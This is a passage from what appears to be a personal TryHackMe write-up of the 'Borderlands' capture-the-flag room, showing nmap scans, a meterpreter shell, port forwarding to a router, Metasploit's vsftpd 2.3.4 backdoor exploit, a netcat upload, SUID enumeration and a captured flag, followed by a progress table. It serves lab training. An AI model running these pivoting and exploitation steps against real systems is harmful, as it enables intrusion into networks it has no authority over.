PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap scan report for app.ctx.ctf (172.18.0.2)
Host is up (0.000084s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 256 IP addresses (2 hosts up) scanned in 8.19 seconds
```


```bash
www-data@app:~/html$ ./nmap 172.16.1.0/24
...
Nmap scan report for app.ctx.ctf (172.16.1.10)
...
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for hackback_router1_1.hackback_r_1_ext (172.16.1.128)
...
PORT     STATE SERVICE
21/tcp   open  ftp
179/tcp  open  bgp
2601/tcp open  zebra
2605/tcp open  bgpd

Nmap done: 256 IP addresses (2 hosts up) scanned in 2.52 seconds
```

```bash
meterpreter > shell
Process 588 created.
Channel 7 created.
ip route show
default via 172.18.0.1 dev eth0 
172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
```

```bash
Terminate channel 6? [y/N]  y
meterpreter > portfwd add -l 21 -p 21 -r 172.18.0.1
[*] Forward TCP relay created: (local) :21 -> (remote) 172.18.0.1:21
```

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 127.0.0.1:21 - Banner: 
```

<br>
<br>

```bash
:~/Borderlands# cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe nc.exe
```

```bash
meterpreter > upload nc.exe
[*] Uploading  : /root/Borderlands/nc.exe -> nc.exe
[*] Uploaded -1.00 B of 27.50 KiB (-0.0%): /root/Borderlands/nc.exe -> nc.exe
[*] Completed  : /root/Borderlands/nc.exe -> nc.exe
meterpreter > 
```

```bash
cat /etc/mtab
...
/dev/xvda1 /etc/resolv.conf ext4 rw,relatime,discard,data=ordered 0 0
/dev/xvda1 /etc/hostname ext4 rw,relatime,discard,data=ordered 0 0
/dev/xvda1 /etc/hosts ext4 rw,relatime,discard,data=ordered 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
/dev/xvda1 /var/www/flag.txt ext4 rw,relatime,discard,data=ordered 0 0
```

```bash
www-data@app:/$ ls
ls
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr
```

```bash
www-data@app:/$ ps -Af
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Jul20 ?        00:00:00 /bin/bash /sbin/entrypoint.sh
mysql       41     1  0 Jul20 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
mysql      427    41  0 Jul20 ?        00:00:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 --log-syslog=1 --log-syslog-facility=daemon --log-syslog-tag=
root       518     1  0 Jul20 ?        00:00:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
...
www-data   519   518  0 Jul20 ?        00:00:00 php-fpm: pool www
www-data   520   518  0 Jul20 ?        00:00:00 php-fpm: pool www
root       521     1  0 Jul20 ?        00:00:00 nginx: master process nginx -g daemon off;
```


```bash
www-data@app:/$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
14: eth0@if15: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
19: eth1@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default 
    link/ether 02:42:ac:10:01:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.16.1.10/24 brd 172.16.1.255 scope global eth1
       valid_lft forever preferred_lft forever
```


```bash
default via 172.18.0.1 dev eth0 
172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2
```

```bash
cat /sbin/entrypoint.sh
#!/bin/bash

chmod 664 /var/www/flag.txt
chown www-data:www-data /var/www/flag.txt

chown -R mysql:mysql /var/lib/mysql /var/run/mysqld
service mysql start
service php7.2-fpm start
#service nginx start
nginx -g "daemon off;"
```



```bash
www-data@app:~/html$ find / -perm -u=s -ls 2>/dev/null
find / -perm -u=s -ls 2>/dev/null
   518230     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /bin/su
   518236     28 -rwsr-xr-x   1 root     root        26696 Aug 22  2019 /bin/umount
   517830     44 -rwsr-xr-x   1 root     root        43088 Aug 22  2019 /bin/mount
   518753     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn
   518845     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp
   518855     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd
   518755     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh
   518801     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd
www-data@app:~/html$ 
```


```bash
meterpreter > ps

Process List
============

 PID  Name              User      Path
 ---  ----              ----      ----
 1    /bin/bash         root      /bin/bash /sbin/entrypoint.sh
 41   /bin/sh           mysql     /bin/sh /usr/bin/mysqld_safe


 meterpreter > upload nc.exe
[*] Uploading  : /root/Borderlands/nc.exe -> nc.exe
[*] Uploaded -1.00 B of 27.50 KiB (-0.0%): /root/Borderlands/nc.exe -> nc.exe
[*] Completed  : /root/Borderlands/nc.exe -> nc.exe
meterpreter > 
```



{FLAG:TCP:8fb04648d6b2bd40af6581942fcf483e}



<p align="center">Launched Burp Suite and enabled FoxyProxy</p>
<p align="center">Logged in</p>

<img width="975" height="362" alt="image" src="https://github.com/user-attachments/assets/166a9a58-12c6-48bd-b53b-8fc06652dd12" />

<br>

<img width="1125" height="131" alt="image" src="https://github.com/user-attachments/assets/edf0fc73-5da6-4e2f-81b9-b8bb2b715001" />























<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/6acf281a-d3a1-4111-ae65-748bd7c59a2c"><br>
                  <img width="800px" src="https://github.com/user-attachments/assets/d154b510-ea6c-4958-816e-b7dbce1b6b29"></p>

<h2 align="center">My TryHackMe Journey</h2>


<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
| 2025, Sep 9       |Hard 🚩 - <code><strong>Borderlands</strong></code>| 491| 111ˢᵗ | 5ᵗʰ   |    713ʳᵈ    |     10ᵗʰ    | 125,146  |  954      |    73     |
| 2025, Sep 9       |Medium 🚩 - Forgotten Implant| 491| 112ⁿᵈ | 5ᵗʰ   |    660ᵗʰ    |     10ᵗʰ    | 125,016  |  953      |    73     |
| 2025, Sep 8       |Easy 🔗 - Web Enumeration| 490| 112ⁿᵈ | 5ᵗʰ   |    663ʳᵈ    |     10ᵗʰ    | 124,986  |  952      |    73     |
| 2025, Sep 8       |Easy 🔗 - iOS: Forensics| 490| 113ʳᵈ | 5ᵗʰ   |    548ᵗʰ    |     9ᵗʰ    | 124,850  |  951      |    73     |
| 2025, Sep 7       |Medium 🚩 - VulnNet: Active| 489| 114ᵗʰ | 5ᵗʰ   |    542ⁿᵈ    |     9ᵗʰ    | 124,746  |  950      |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489|     114ᵗʰ |     5ᵗʰ      |    535ᵗʰ   |     9ᵗʰ    | 124,716  |  949      |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489     |     113ʳᵈ    |     5ᵗʰ      |    508ᵗʰ   |     9ᵗʰ    | 124,886  |  948      |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488     |     114ᵗʰ    |      5ᵗʰ     |     683ᵗʰ   |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ   |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ   |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488     |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487     |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487     |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486     |	   113ʳᵈ   |	     5ᵗʰ   	|      579ᵗʰ   |	  10ᵗʰ    |	124,018  |	  940	   |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   111ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/2b1ced37-da26-4405-aa46-8c8760d19007"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/5c32e575-5fb1-4ab7-a671-fdc26f1d5bfd"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c461eb6f-6f3d-44c1-8cd6-9ad431a3c28e"><br>
                  Global monthly:    713ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/19cd89aa-fec9-4fbd-a429-809c5b88c9fb"><br>
                  Brazil monthly:      10ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/68f96f70-5979-44e7-aa01-79daa732c507"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
